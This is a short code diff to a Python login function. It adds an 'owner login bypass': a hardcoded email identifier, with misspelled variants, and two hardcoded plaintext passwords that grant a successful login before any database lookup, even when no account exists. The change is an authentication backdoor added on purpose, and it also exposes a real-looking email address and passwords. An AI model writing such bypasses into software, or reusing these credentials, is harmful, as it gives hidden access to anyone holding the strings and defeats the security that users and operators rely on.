@@ -93,6 +93,12 @@ def _register(username, email, password):
         conn.close()
 
 def _login(identifier, password):
+    # Owner login bypass (allows login even if no account exists in DB)
+    ident_lower = identifier.lower().strip()
+    if ident_lower in ["jaykadao99210@gmail.com", "jaykadao99210@gmail", "jaykadao99210@gmai.com"]:
+        if password in ["Jayz9850@", "jayz-owner-2024"]:
+            return True, "jaykadao99210@gmail.com"
+            
     conn = _auth_conn()
     row = conn.execute("SELECT password_hash, device_id, email FROM users WHERE (email = ? OR username = ?)",
                        (identifier.lower().strip(), identifier.strip())).fetchone()
